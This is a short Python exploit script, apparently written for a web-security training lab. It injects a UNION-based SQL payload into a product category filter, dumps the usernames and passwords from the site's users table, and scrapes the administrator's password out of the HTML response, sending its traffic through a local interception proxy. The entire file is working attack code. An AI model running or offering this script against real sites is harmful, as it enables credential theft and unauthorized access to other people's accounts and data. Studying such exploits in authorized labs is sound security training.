import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = 'filter?category=Gifts'
    sql_payload = "'+UNION+SELECT+username,password+FROM+users--"
    r = requests.get(f'{url}{path}{sql_payload}',verify=False, proxies=proxies)
    res = r.text
    if 'administrator' in res:
        print("[+] Password del administrador encontrada.")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
        print(f'[+] La contraseña del administrador es: {admin_password}')
    return True
        

def main():
    try:
        url = sys.argv[1].strip()
        
        
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url> ')
        print(f'[-] Example: {sys.argv[0]} <url> "\'+UNION+SELECT+NULL,NULL--"')
        sys.exit(-1)
    
    print("[+] Dumping the list of usernames and passwords...")
    if not exploit_sqli_users_table(url):
        print("[-] No se encontró la clace del administrador")
    

if __name__ == '__main__':
    main()